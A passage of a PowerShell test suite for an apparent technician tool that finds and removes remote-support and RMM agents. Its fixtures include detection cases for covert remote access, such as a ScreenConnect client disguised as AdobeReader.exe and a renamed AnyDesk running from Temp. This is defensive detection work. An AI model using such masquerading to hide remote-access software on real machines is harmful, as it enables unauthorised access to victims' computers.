$hiddenService = [pscustomobject]@{ProductId='screenconnect';ProductName='ScreenConnect / ConnectWise Control';Category='remote-support';ArtifactType='Service';Name='ScreenConnect Client Hidden';Path='C:\Users\Victim\AppData\Roaming\Adobe\AdobeReader.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='23.9.0'}
$hiddenGuardian = [pscustomobject]@{ProductId='screenconnect';ProductName='ScreenConnect / ConnectWise Control';Category='remote-support';ArtifactType='Service';Name='ScreenConnect Client Hidden Guardian';Path='C:\ProgramData\HiddenSupport\Guardian.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='23.9.0'}
$secondHiddenService = [pscustomobject]@{ProductId='screenconnect';ProductName='ScreenConnect / ConnectWise Control';Category='remote-support';ArtifactType='Service';Name='ScreenConnect Client Second Hidden';Path='C:\Users\Victim\AppData\Local\Support\Client.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='22.8.0'}
$scopes = @(New-RemovalCandidates @($legitimateInstall,$legitimateService,$hiddenService,$hiddenGuardian,$secondHiddenService))
Assert-True ($scopes.Count -eq 3) 'Three detected ScreenConnect versions remain three separate technician decisions'
Assert-True (@($scopes | Where-Object {$_.DetectedVersion -eq '24.1.0'}).Findings.Count -eq 2) 'Installed program and service for the same ScreenConnect version are grouped together'
Assert-True (@($scopes | Where-Object {$_.DetectedVersion -eq '23.9.0'}).Locations.Count -eq 2) 'Protecting copies of the same ScreenConnect version across locations are grouped together'
Assert-True (@($scopes | Where-Object {$_.DetectedVersion -eq '22.8.0'}).Count -eq 1) 'A different hidden ScreenConnect version stays independently removable'
$version24Candidate = @($scopes | Where-Object {$_.DetectedVersion -eq '24.1.0'})[0]
Assert-True (Test-FindingBelongsToCandidate -Finding $legitimateService -Candidate $version24Candidate) 'Verification keeps an anchored component build with its installed product version'
$differentVersionSameName = [pscustomobject]@{ProductId='screenconnect';Category='remote-support';ArtifactType='Service';Name='ScreenConnect Client Company';Path='C:\Program Files\ScreenConnect\Client\ScreenConnect.ClientService.exe';InstallLocation=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='23.9.0'}
Assert-True (-not (Test-FindingBelongsToCandidate -Finding $differentVersionSameName -Candidate $version24Candidate)) 'Verification does not confuse a remaining different version with the version that was removed'

$teamViewerStartFinding = [pscustomobject]@{ProductId='teamviewer';ProductName='TeamViewer';Category='remote-support';ArtifactType='StartApp';Name='TeamViewer Remote';Path=$null;InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion=$null;StoreProductIds=@('XPDM17HK323C4X')}
$teamViewerStartCandidate = @(New-RemovalCandidates @($teamViewerStartFinding))[0]
$teamViewerAppxRemaining = [pscustomobject]@{ProductId='teamviewer';ProductName='TeamViewer';Category='remote-support';ArtifactType='AppxPackage';Name='TeamViewer.Remote';Path='C:\Program Files\WindowsApps\TeamViewer.Remote_15.0.0.0_x64';InstallLocation=$null;RegistryPath=$null;PackageFullName='TeamViewer.Remote_15.0.0.0_x64__publisher';DisplayVersion='15.0.0.0';FileVersion=$null;StoreProductIds=@('XPDM17HK323C4X')}
Assert-True (Test-FindingBelongsToCandidate -Finding $teamViewerAppxRemaining -Candidate $teamViewerStartCandidate) 'A Store app first seen through Start remains tied to the candidate when verification sees it through AppX'

$teamViewerAppxCandidate = @(New-RemovalCandidates @($teamViewerAppxRemaining))[0]
$teamViewerStartRemaining = [pscustomobject]@{ProductId='teamviewer';ProductName='TeamViewer';Category='remote-support';ArtifactType='StartApp';Name='TeamViewer Remote';Path=$null;InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion=$null;StoreProductIds=@('XPDM17HK323C4X')}
Assert-True (Test-FindingBelongsToCandidate -Finding $teamViewerStartRemaining -Candidate $teamViewerAppxCandidate) 'A Store app first seen through AppX cannot be falsely verified removed when only its Start registration remains'
$teamViewerDifferentAppxVersion = $teamViewerAppxRemaining.PSObject.Copy()
$teamViewerDifferentAppxVersion.DisplayVersion = '16.0.0.0'
$teamViewerDifferentAppxVersion.PackageFullName = 'TeamViewer.Remote_16.0.0.0_x64__publisher'
Assert-True (-not (Test-FindingBelongsToCandidate -Finding $teamViewerDifferentAppxVersion -Candidate $teamViewerAppxCandidate)) 'A versioned Store finding still distinguishes a separately installed version'

$sameProductOtherVersion = $teamViewerAppxCandidate.PSObject.Copy()
$sameProductOtherVersion.Id = 'teamviewer-2'
$sameProductOtherVersion.DetectedVersion = '16.0.0.0'
$teamViewerAppxCandidate.Id = 'teamviewer-1'
$storeDecisions = @{'teamviewer-1'='Remove';'teamviewer-2'='KeepApproved'}
Assert-True (Test-CandidateHasKeptProductPeer -Candidate $teamViewerAppxCandidate -AllCandidates @($teamViewerAppxCandidate,$sameProductOtherVersion) -DecisionById $storeDecisions) 'A kept version prevents product-wide Store fallback for the selected version'

$appxRemovalCandidate = [pscustomobject]@{Findings=@([pscustomobject]@{PackageFullName='TeamViewer.Remote_15.0.0.0_x64__publisher';PackageName='TeamViewer.Remote'})}
$successfulAppxResult = & {
    function Write-RemediationLog { param($Message,$Color) }
    function Remove-AppxPackage { param($Package,[switch]$AllUsers) }
    function Get-AppxProvisionedPackage { param([switch]$Online); return @() }
    Remove-CandidateAppxPackages -Candidate $appxRemovalCandidate
}
Assert-True ($successfulAppxResult.Attempted -and $successfulAppxResult.Success) 'Successful Windows package removal suppresses unnecessary Store-ID fallback'
$failedAppxResult = & {
    function Write-RemediationLog { param($Message,$Color) }
    function Remove-AppxPackage { param($Package,[switch]$AllUsers); throw 'synthetic removal failure' }
    function Get-AppxProvisionedPackage { param([switch]$Online); return @() }
    Remove-CandidateAppxPackages -Candidate $appxRemovalCandidate
}
Assert-True ($failedAppxResult.Attempted -and -not $failedAppxResult.Success) 'A failed Windows package removal is surfaced so exact Store-ID fallback can run'

$syncroService = [pscustomobject]@{ProductId='syncro';ProductName='SyncroMSP Agent';Category='rmm';ArtifactType='Service';Name='Syncro';Path='C:\ProgramData\Syncro\bin\Syncro.Service.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='1.0.73.16374'}
$syncroLive = [pscustomobject]@{ProductId='syncro';ProductName='SyncroMSP Agent';Category='rmm';ArtifactType='Process';Name='Syncro Live';Path='C:\Program Files\RepairTech\LiveAgent\SyncroLive.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='1.0.29.18406'}
$syncroInstall = [pscustomobject]@{ProductId='syncro';ProductName='SyncroMSP Agent';Category='rmm';ArtifactType='InstalledProgram';Name='Syncro';Path='C:\Program Files\RepairTech\Syncro';InstallLocation='C:\Program Files\RepairTech\Syncro';RegistryPath='HKLM:\Software\Uninstall\Syncro';PackageFullName=$null;DisplayVersion='1.0.203.18518';FileVersion=$null}
$syncroScopes = @(New-RemovalCandidates @($syncroService,$syncroLive,$syncroInstall) -ManagedIdentityStatus $approvedManagedIdentity)
Assert-True ($syncroScopes.Count -eq 1 -and $syncroScopes[0].IsManagedSuite -and $syncroScopes[0].DetectedVersion -eq '1.0.203.18518' -and $syncroScopes[0].Locations.Count -eq 3) 'Different Syncro component build numbers are shown once as the managed suite'

$splashtopInstall = [pscustomobject]@{ProductId='splashtop';ProductName='Splashtop Streamer / SOS';Category='remote-support';ArtifactType='InstalledProgram';Name='Splashtop Streamer';Path='C:\Program Files (x86)\Splashtop\Splashtop Remote';InstallLocation='C:\Program Files (x86)\Splashtop\Splashtop Remote';RegistryPath='HKLM:\Software\Uninstall\Splashtop';PackageFullName=$null;DisplayVersion='3.8.4.1';FileVersion=$null}
$splashtopService = [pscustomobject]@{ProductId='splashtop';ProductName='Splashtop Streamer / SOS';Category='remote-support';ArtifactType='Service';Name='SplashtopRemoteService';Path='C:\Program Files (x86)\Splashtop\Splashtop Remote\Server\SRService.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='3.82.2.9'}
$syncroDownloadedInstaller = [pscustomobject]@{ProductId='syncro';ProductName='SyncroMSP Agent';Category='rmm';ArtifactType='File';Name='SyncroSetup.exe';Path='C:\Users\Tech\Downloads\SyncroSetup.exe';SourcePath=$null;InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='1.0.203.18518'}
$managedScopes = @(New-RemovalCandidates @($syncroService,$syncroLive,$syncroInstall,$splashtopInstall,$splashtopService,$syncroDownloadedInstaller) -ManagedIdentityStatus $approvedManagedIdentity)
Assert-True ($managedScopes.Count -eq 1 -and $managedScopes[0].IsManagedSuite -and @($managedScopes[0].ProductIds).Count -eq 2 -and $managedScopes[0].Findings.Count -eq 6) 'Syncro, its bundled Splashtop components, and a passive downloaded installer collapse into one protected managed item'
Assert-True (Test-FindingBelongsToCandidate -Finding $splashtopService -Candidate $managedScopes[0]) 'Protected managed-suite evidence includes its Splashtop components'
$managedOnlySets = Split-CompuTekRemovalCandidates -Candidates $managedScopes
Assert-True (@($managedOnlySets.Protected).Count -eq 1 -and @($managedOnlySets.Review).Count -eq 0) 'A verified managed suite receives no technician removal number'
$managedRemovalRejected = $false
try { Invoke-FullCandidateRemoval -Candidate $managedScopes[0] } catch { $managedRemovalRejected = ($_.Exception.Message -match 'Protected CompuTek managed access') }
Assert-True $managedRemovalRejected 'The removal engine rejects a protected managed candidate even if another code path passes it one'
$standaloneSplashtop = @(New-RemovalCandidates @($splashtopInstall,$splashtopService) -ManagedIdentityStatus $unapprovedManagedIdentity)
Assert-True ($standaloneSplashtop.Count -eq 1 -and -not $standaloneSplashtop[0].IsManagedSuite) 'Standalone Splashtop remains a normal review finding when no Syncro primary agent is present'
$hiddenSplashtop = [pscustomobject]@{ProductId='splashtop';ProductName='Splashtop Streamer / SOS';Category='remote-support';ArtifactType='Service';Name='HiddenSupport';Path='C:\Users\Victim\AppData\Roaming\Support\SRService.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='9.9.9'}
$managedWithHidden = @(New-RemovalCandidates @($syncroService,$syncroLive,$syncroInstall,$splashtopInstall,$splashtopService,$hiddenSplashtop) -ManagedIdentityStatus $approvedManagedIdentity)
Assert-True ($managedWithHidden.Count -eq 2 -and @($managedWithHidden | Where-Object {$_.IsManagedSuite}).Count -eq 1 -and @($managedWithHidden | Where-Object {-not $_.IsManagedSuite -and $_.Findings.Path -contains $hiddenSplashtop.Path}).Count -eq 1) 'A hidden user-profile Splashtop copy stays separately flagged beside the standard managed suite'
$managedWithHiddenSets = Split-CompuTekRemovalCandidates -Candidates $managedWithHidden
Assert-True (@($managedWithHiddenSets.Protected).Count -eq 1 -and @($managedWithHiddenSets.Review).Count -eq 1 -and $managedWithHiddenSets.Review[0].Index -eq 1 -and -not $managedWithHiddenSets.Review[0].IsManagedSuite) 'Only the separate unverified Splashtop copy receives technician review number 1'

$splashtopStoreA = [pscustomobject]@{ProductId='splashtop';ProductName='Splashtop Streamer / SOS';Category='remote-support';ArtifactType='AppxPackage';Name='Splashtop.StoreA';Path='C:\Program Files\WindowsApps\Splashtop.StoreA_3.8.400.0_x86';InstallLocation=$null;RegistryPath=$null;PackageFullName='Splashtop.StoreA_3.8.400.0_x86__publisher';DisplayVersion='3.8.400.0';FileVersion=$null}
$splashtopStoreB = [pscustomobject]@{ProductId='splashtop';ProductName='Splashtop Streamer / SOS';Category='remote-support';ArtifactType='AppxPackage';Name='Splashtop.StoreB';Path='C:\Program Files\WindowsApps\Splashtop.StoreB_3.7.600.0_x86';InstallLocation=$null;RegistryPath=$null;PackageFullName='Splashtop.StoreB_3.7.600.0_x86__publisher';DisplayVersion='3.7.600.0';FileVersion=$null}
$managedWithStorePackages = @(New-RemovalCandidates @($syncroService,$syncroLive,$syncroInstall,$splashtopStoreA,$splashtopStoreB) -ManagedIdentityStatus $approvedManagedIdentity)
Assert-True ($managedWithStorePackages.Count -eq 3 -and @($managedWithStorePackages | Where-Object {$_.IsManagedSuite}).Count -eq 1 -and @($managedWithStorePackages | Where-Object {$_.ProductId -eq 'splashtop' -and -not $_.IsManagedSuite}).Count -eq 2) 'Separate Splashtop Store packages are never claimed as CompuTek merely because approved Syncro is installed'
$syncroOnlyManagedCandidate = @($managedWithStorePackages | Where-Object {$_.IsManagedSuite})[0]
Assert-True (@($syncroOnlyManagedCandidate.ProductIds) -notcontains 'splashtop' -and -not (Test-FindingBelongsToCandidate -Finding $splashtopStoreA -Candidate $syncroOnlyManagedCandidate)) 'Verification of managed Syncro does not wait for or remove an unrelated Splashtop Store package'
$protectedSplashtopCandidate = @($managedWithHidden | Where-Object {$_.IsManagedSuite})[0]
$separateSplashtopCandidate = @($managedWithHidden | Where-Object {-not $_.IsManagedSuite})[0]
$protectedStoreDecisions = @{}
$protectedStoreDecisions[$protectedSplashtopCandidate.Id] = 'ProtectedManagedAccess'
$protectedStoreDecisions[$separateSplashtopCandidate.Id] = 'Remove'
Assert-True (Test-CandidateHasKeptProductPeer -Candidate $separateSplashtopCandidate -AllCandidates $managedWithHidden -DecisionById $protectedStoreDecisions) 'Protected managed access blocks product-wide fallback while a separate same-product item is removed'

$anyDeskInstall = [pscustomobject]@{ProductId='anydesk';ProductName='AnyDesk';Category='remote-support';ArtifactType='InstalledProgram';Name='AnyDesk';Path='C:\Program Files (x86)\AnyDesk';InstallLocation='C:\Program Files (x86)\AnyDesk';RegistryPath='HKLM:\Software\Uninstall\AnyDesk';PackageFullName=$null;DisplayVersion='9.7.15';FileVersion=$null;SignatureStatus='Unknown';CompanyName=''}
$anyDeskWindowsHost = [pscustomobject]@{ProductId='anydesk';ProductName='AnyDesk';Category='remote-support';ArtifactType='Process';Name='rundll32.exe';Path=(Join-Path $env:SystemRoot 'SysWOW64\rundll32.exe');InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='10.0.26100.1';SignatureStatus='Valid';CompanyName='Microsoft Corporation';Signer='CN=Microsoft Corporation'}
$anyDeskScopes = @(New-RemovalCandidates @($anyDeskInstall,$anyDeskWindowsHost) -ManagedIdentityStatus $unapprovedManagedIdentity)
Assert-True ($anyDeskScopes.Count -eq 1 -and $anyDeskScopes[0].DetectedVersion -eq '9.7.15' -and $anyDeskWindowsHost.SupportingOnly -and @($anyDeskScopes[0].Locations | Where-Object {$_ -match '(?i)\\windows\\'}).Count -eq 0) 'A Microsoft rundll32 helper is supporting evidence for AnyDesk, not a duplicate agent or removable Windows process'
$anyDeskPrefixedInstall = $anyDeskInstall.PSObject.Copy()
$anyDeskPrefixedInstall.DisplayVersion = 'ad 9.7.15'
$anyDeskService = [pscustomobject]@{ProductId='anydesk';ProductName='AnyDesk';Category='remote-support';ArtifactType='Service';Name='AnyDesk';Path='C:\Program Files (x86)\AnyDesk\AnyDesk.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='9.7.15';SignatureStatus='Valid';CompanyName='AnyDesk Software GmbH'}
$anyDeskTempUninstaller = [pscustomobject]@{ProductId='anydesk';ProductName='AnyDesk';Category='remote-support';ArtifactType='File';Name='AnyDeskUninst1234.exe';Path='C:\Users\Victim\AppData\Local\Temp\AnyDeskUninst1234.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='9.7.15';SignatureStatus='Valid';CompanyName='AnyDesk Software GmbH'}
$anyDeskPrintDriver = [pscustomobject]@{ProductId='anydesk';ProductName='AnyDesk';Category='remote-support';ArtifactType='File';Name='AnyDeskPrintDriverRenderFilter.dll';Path='C:\Users\Victim\AppData\Roaming\AnyDesk\printer_driver\AnyDeskPrintDriverRenderFilter.dll';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='10.0.10011.16384';SignatureStatus='Valid';CompanyName='Windows DDK provider'}
$anyDeskFieldScopes = @(New-RemovalCandidates @($anyDeskPrefixedInstall,$anyDeskService,$anyDeskTempUninstaller,$anyDeskPrintDriver) -ManagedIdentityStatus $unapprovedManagedIdentity)
Assert-True ($anyDeskFieldScopes.Count -eq 1 -and $anyDeskFieldScopes[0].DetectedVersion -eq '9.7.15' -and $anyDeskFieldScopes[0].Findings.Count -eq 4) 'One AnyDesk installation is displayed once despite a prefixed uninstall version, temporary uninstaller, and printer-driver build version'
$anyDeskPortable = [pscustomobject]@{ProductId='anydesk';ProductName='AnyDesk';Category='remote-support';ArtifactType='Process';Name='AnyDesk.exe';Path='C:\Users\Victim\Downloads\AnyDesk.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='8.0.0';SignatureStatus='Valid';CompanyName='AnyDesk Software GmbH'}
$anyDeskWithPortableScopes = @(New-RemovalCandidates @($anyDeskPrefixedInstall,$anyDeskService,$anyDeskPrintDriver,$anyDeskPortable) -ManagedIdentityStatus $unapprovedManagedIdentity)
Assert-True ($anyDeskWithPortableScopes.Count -eq 2 -and @($anyDeskWithPortableScopes | Where-Object {$_.DetectedVersion -eq '8.0.0'}).Count -eq 1) 'A separately running AnyDesk portable copy with another version stays independently removable'

$storeTeamPackage = [pscustomobject]@{ProductId='team-remote-desktop';ProductName='Team Remote Desktop (Microsoft Store)';Category='remote-support';ArtifactType='AppxPackage';Name='YellowElephantProductions.TeamRemoteDesktop';Path='C:\Program Files\WindowsApps\YellowElephantProductions.TeamRemoteDesktop_1.2.90.0_x64__publisher';InstallLocation=$null;RegistryPath=$null;PackageFullName='YellowElephantProductions.TeamRemoteDesktop_1.2.90.0_x64__publisher';DisplayVersion='1.2.90.0';FileVersion=$null}
$storeTeamProcess = [pscustomobject]@{ProductId='team-remote-desktop';ProductName='Team Remote Desktop (Microsoft Store)';Category='remote-support';ArtifactType='Process';Name='TeamRemoteDesktop.exe';Path='C:\Program Files\WindowsApps\YellowElephantProductions.TeamRemoteDesktop_1.2.90.0_x64__publisher\TeamRemoteDesktop\TeamRemoteDesktop.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion=$null}
$storeTeamHelper = [pscustomobject]@{ProductId='team-remote-desktop';ProductName='Team Remote Desktop (Microsoft Store)';Category='remote-support';ArtifactType='Process';Name='crashpad_handler.exe';Path='C:\Program Files\WindowsApps\YellowElephantProductions.TeamRemoteDesktop_1.2.90.0_x64__publisher\TeamRemoteDesktop\crashpad_handler.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='0.12.2'}
$storeTeamScopes = @(New-RemovalCandidates @($storeTeamPackage,$storeTeamProcess,$storeTeamHelper) -ManagedIdentityStatus $unapprovedManagedIdentity)
Assert-True ($storeTeamScopes.Count -eq 1 -and $storeTeamScopes[0].DetectedVersion -eq '1.2.90.0' -and $storeTeamScopes[0].Findings.Count -eq 3) 'One Store installation is displayed once even when its helper executable has a different component version'

$teamViewerShortcutA = [pscustomobject]@{ProductId='teamviewer';ProductName='TeamViewer';Category='remote-support';ArtifactType='File';Name='TeamViewer.lnk';Path='C:\ProgramData\Microsoft\Windows\Start Menu\Programs\TeamViewer.lnk';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion=$null}
$teamViewerShortcutB = [pscustomobject]@{ProductId='teamviewer';ProductName='TeamViewer';Category='remote-support';ArtifactType='File';Name='TeamViewer.lnk';Path='C:\Users\Public\Desktop\TeamViewer.lnk';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion=$null}
$teamViewerShortcutScopes = @(New-RemovalCandidates @($teamViewerStartFinding,$teamViewerShortcutA,$teamViewerShortcutB) -ManagedIdentityStatus $unapprovedManagedIdentity)
Assert-True ($teamViewerShortcutScopes.Count -eq 1 -and $teamViewerShortcutScopes[0].Findings.Count -eq 3) 'Start registration and shortcut evidence for the same product are one technician decision'

$keepSelection = @(ConvertTo-CompuTekCandidateSelection -Text 'KEEP 1,3-5' -Maximum 7 -ExpectedAction KEEP)
$removeSelection = @(ConvertTo-CompuTekCandidateSelection -Text 'REMOVE 2,6-7' -Maximum 7 -ExpectedAction REMOVE)
$openSelection = @(ConvertTo-CompuTekCandidateSelection -Text 'OPEN 1,4-5' -Maximum 7 -ExpectedAction OPEN)
Assert-True (($keepSelection -join ',') -eq '1,3,4,5' -and ($removeSelection -join ',') -eq '2,6,7' -and ($openSelection -join ',') -eq '1,4,5') 'Batch decisions and folder opening accept comma-separated numbers and ranges'
$keepNoneSelection = @(ConvertTo-CompuTekCandidateSelection -Text 'KEEP NONE' -Maximum 7 -ExpectedAction KEEP)
$removeAllSelection = @(ConvertTo-CompuTekCandidateSelection -Text 'REMOVE ALL' -Maximum 7 -ExpectedAction REMOVE)
Assert-True ($keepNoneSelection.Count -eq 0 -and ($removeAllSelection -join ',') -eq '1,2,3,4,5,6,7') 'KEEP NONE and REMOVE ALL explicitly classify every finding for removal'
$invalidSelectionRejected = $false
try { ConvertTo-CompuTekCandidateSelection -Text 'REMOVE 8' -Maximum 7 -ExpectedAction REMOVE | Out-Null } catch { $invalidSelectionRejected = $true }
Assert-True $invalidSelectionRejected 'Batch decisions reject unavailable agent numbers'

$installerTestRoot = Join-Path $artifactRoot ('InstallerOpenTest-' + [Guid]::NewGuid().ToString('N'))
try {
    $downloadFolder = New-Item -Path (Join-Path $installerTestRoot 'Downloads') -ItemType Directory -Force
    $downloadedInstaller = Join-Path $downloadFolder.FullName 'RemoteSupportSetup.exe'
    Set-Content -LiteralPath $downloadedInstaller -Value 'test' -Encoding ASCII
    $installerCandidate = [pscustomobject]@{Findings=@(
        [pscustomobject]@{ArtifactType='File';Path=$downloadedInstaller;SourcePath=$null},
        [pscustomobject]@{ArtifactType='InstalledProgram';Path=$downloadFolder.FullName;SourcePath=$null}
    )}
    $installerFiles = @(Get-CandidateInstallerFiles $installerCandidate)
    Assert-True ($installerFiles.Count -eq 1 -and $installerFiles[0] -eq $downloadedInstaller) 'OPEN targets a detected downloaded installer file rather than an installed-program folder'
} finally {
    $resolvedInstallerTestRoot = [IO.Path]::GetFullPath($installerTestRoot)
    if ($resolvedInstallerTestRoot.StartsWith($artifactRoot + [IO.Path]::DirectorySeparatorChar,[StringComparison]::OrdinalIgnoreCase) -and (Test-Path -LiteralPath $resolvedInstallerTestRoot)) {
        Remove-Item -LiteralPath $resolvedInstallerTestRoot -Recurse -Force
    }
}

$hiddenScreenConnect = New-TestEvidence @{
    ArtifactType='Service';Name='ScreenConnect Client 0123456789abcdef';DisplayName='ScreenConnect Client 0123456789abcdef'
    Path='C:\Users\Victim\AppData\Roaming\Adobe\AdobeReader.exe';CommandLine='"C:\Users\Victim\AppData\Roaming\Adobe\AdobeReader.exe" -service'
    OriginalFilename='ScreenConnect.ClientService.exe';FileName='AdobeReader.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $hiddenScreenConnect)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'screenconnect') 'Hidden ScreenConnect service with a variable service name is detected'
Assert-True ($matches[0].Strength -eq 'High') 'Hidden ScreenConnect evidence is high confidence'

$renamedAnyDesk = New-TestEvidence @{
    ArtifactType='Process';Name='support.exe';DisplayName='support.exe';Path='C:\Users\Victim\AppData\Local\Temp\support.exe'
    OriginalFilename='AnyDesk.exe';ProductName='AnyDesk';FileName='support.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $renamedAnyDesk)
Assert-True ($matches.Product.id -contains 'anydesk') 'Renamed AnyDesk executable is detected from original filename/product metadata'

$modernNable = New-TestEvidence @{
    ArtifactType='Service';Name='MSPAgent';DisplayName='MSP Agent';Path='C:\Program Files (x86)\Msp Agent\msp-agent-core.exe'
    ProductName='MSP Agent by N-able';OriginalFilename='msp-agent-core.exe';FileName='msp-agent-core.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $modernNable)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'n-able-rmm') 'The current N-able MSPAgent service and executable are detected as N-central/N-sight RMM'
$legacyNable = New-TestEvidence @{
    ArtifactType='Service';Name='Windows Agent Service';DisplayName='Windows Agent Service';Path='C:\Program Files (x86)\N-able Technologies\Windows Agent\bin\agent.exe';FileName='agent.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $legacyNable)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'n-able-rmm') 'A legacy N-able Windows Agent is detected from its vendor-specific installation path without treating every agent.exe as RMM'
$ninjaRemotePlayer = New-TestEvidence @{
    ArtifactType='File';Name='ncplayer.exe';DisplayName='ncplayer.exe';Path='C:\Users\Victim\AppData\Roaming\NinjaRemote\ncplayer.exe';FileName='ncplayer.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $ninjaRemotePlayer)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'ninjaone') 'Ninja Remote ncplayer in its exact NinjaRemote folder is detected as NinjaOne remote-support software'

$teamViewerStore = New-TestEvidence @{
    ArtifactType='StartApp';Name='TeamViewer Remote';DisplayName='TeamViewer Remote';PackageName='TeamViewer.Remote'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $teamViewerStore)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'teamviewer' -and @($matches[0].Product.storeProductIds) -contains 'XPDM17HK323C4X') 'TeamViewer Remote is detected through its Start registration and retains its exact Store product ID'
$teamRemoteDesktopStore = New-TestEvidence @{
    ArtifactType='StartApp';Name='Team Remote Desktop';DisplayName='Team Remote Desktop'
    PackageName='YellowElephantProductions.TeamRemoteDesktop_p3e1zgp7z7szg!App'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $teamRemoteDesktopStore)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'team-remote-desktop' -and @($matches[0].Product.storeProductIds) -contains '9P90CMJ610D0') 'The exact Team Remote Desktop Start registration and Store product ID are detected'

$goToAssistService = New-TestEvidence @{
    ArtifactType='Service';Name='GoToAssist Remote Support Customer';DisplayName='GoToAssist Remote Support Customer'
    Path='C:\Program Files (x86)\LogMeInInc\GoToAssist Remote Support Customer\g2ax_service.exe';FileName='g2ax_service.exe';OriginalFilename='g2ax_service.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $goToAssistService)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'gotoassist') 'GoToAssist Remote Support and its g2ax service are detected'
$goToOpener = New-TestEvidence @{
    ArtifactType='InstalledProgram';Name='GoTo Opener';DisplayName='GoTo Opener';Path='C:\Users\Victim\AppData\Local\GoToOpener\GoToOpener.exe'
    ProductName='GoTo Opener';Publisher='GoTo Technologies USA, LLC';FileName='GoToOpener.exe';OriginalFilename='GoToOpener.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $goToOpener)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'goto-opener') 'GoTo Opener is detected separately from the GoToAssist agent'
$ordinaryGoToApp = New-TestEvidence @{
    ArtifactType='InstalledProgram';Name='GoTo';DisplayName='GoTo';Path='C:\Users\Victim\AppData\Local\Programs\GoTo\GoTo.exe'
    ProductName='GoTo';Publisher='GoTo Technologies USA, LLC';FileName='GoTo.exe';OriginalFilename='GoTo.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $ordinaryGoToApp)
Assert-True ($matches.Product.id -notcontains 'gotoassist' -and $matches.Product.id -notcontains 'goto-opener') 'The ordinary GoTo meeting/communications app is not mislabeled as GoToAssist or GoTo Opener'

$genericVncViewer = New-TestEvidence @{
    ArtifactType='File';Name='vncviewer.exe';DisplayName='vncviewer.exe';Path='C:\Temp\vncviewer.exe';FileName='vncviewer.exe';OriginalFilename='vncviewer.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $genericVncViewer)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'vnc-viewer-generic') 'An otherwise unidentified VNC Viewer is shown once instead of as three vendors'
$realVncViewer = New-TestEvidence @{
    ArtifactType='File';Name='vncviewer.exe';DisplayName='VNC Viewer';Path='C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe';FileName='vncviewer.exe';OriginalFilename='vncviewer.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $realVncViewer)
Assert-True ($matches.Count -eq 1 -and $matches[0].Product.id -eq 'realvnc') 'A vendor-specific VNC path suppresses the generic fallback finding'

$zohoBooks = New-TestEvidence @{
    ArtifactType='InstalledProgram';Name='Zoho Books';DisplayName='Zoho Books';Path='C:\Program Files\Zoho\Books\books.exe'
    Publisher='Zoho Corporation';ProductName='Zoho Books';FileName='books.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $zohoBooks)
Assert-True ($matches.Product.id -notcontains 'zoho-assist') 'Broad Zoho publisher does not misidentify another Zoho product as Zoho Assist'

$autodeskInstaller = New-TestEvidence @{
    ArtifactType='File';Name='Autodesk_DWG_TrueView_setup.exe';DisplayName='Autodesk DWG TrueView';
    Path='C:\Users\Technician\Downloads\Autodesk_DWG_TrueView_setup.exe';ProductName='Autodesk Installer';FileName='Autodesk_DWG_TrueView_setup.exe'
}
$matches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $autodeskInstaller)
Assert-True ($matches.Product.id -notcontains 'todesk') 'Token-boundary matching does not misidentify Autodesk as ToDesk'

$quickAssist = New-TestEvidence @{
